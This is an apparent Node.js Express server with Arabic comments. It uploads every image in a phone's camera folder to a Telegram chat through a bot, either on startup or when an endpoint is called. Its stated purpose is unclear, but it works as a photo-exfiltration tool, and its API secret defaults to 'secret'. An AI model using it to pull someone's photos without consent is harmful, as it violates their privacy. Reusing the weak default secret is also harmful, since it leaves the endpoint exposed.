require('dotenv').config();
const express = require('express');
const fg = require('fast-glob');
const fs = require('fs');
const path = require('path');
const FormData = require('form-data');
const axios = require('axios');

const app = express();
app.use(express.json());

// خدمة ملفات الواجهة من فولدر public
app.use(express.static(path.join(__dirname, 'public')));

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const FOLDER_PATH = process.env.FOLDER_PATH || '/sdcard/DCIM/Camera';
const API_SECRET = process.env.API_SECRET || 'secret';
const PORT = process.env.PORT || 3000;
const AUTO_SEND_ON_STARTUP = (process.env.AUTO_SEND_ON_STARTUP || 'false').toLowerCase() === 'true';
const DELAY_BETWEEN_PHOTOS = 700; // بالمللي ثانية لتجنب الحظر

async function listImages(folder) {
  return await fg(['**/*.jpg','**/*.jpeg','**/*.png'], { cwd: folder, absolute: true });
}

async function sendPhoto(filePath) {
  const form = new FormData();
  form.append('chat_id', CHAT_ID);
  form.append('caption', `📸 ${path.basename(filePath)}\n🕒 ${new Date().toLocaleString('ar-EG')}`);
  form.append('photo', fs.createReadStream(filePath));
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
  const headers = form.getHeaders();
  await axios.post(url, form, { headers, timeout: 60000 });
}

async function sendAllImages(folder) {
  const files = await listImages(folder);
  let sentCount = 0;
  for (const f of files) {
    try {
      await sendPhoto(f);
      sentCount++;
      await new Promise(r => setTimeout(r, DELAY_BETWEEN_PHOTOS));
    } catch (e) {
      console.error(`❌ فشل إرسال الصورة ${f}:`, e.message);
    }
  }
  return sentCount;
}

app.post('/send-now', async (req, res) => {
  const key = req.headers['x-api-secret'] || '';
  if (key !== API_SECRET) return res.status(401).json({ ok: false, error: 'Unauthorized' });
  const sent = await sendAllImages(FOLDER_PATH);
  res.json({ ok: true, sent });
});

app.listen(PORT, async () => {
  console.log(`✅ السيرفر شغال على المنفذ ${PORT}`);
  if (AUTO_SEND_ON_STARTUP) {
    console.log('⏳ جاري إرسال الصور تلقائيًا عند بدء التشغيل...');
    await sendAllImages(FOLDER_PATH);
  }
});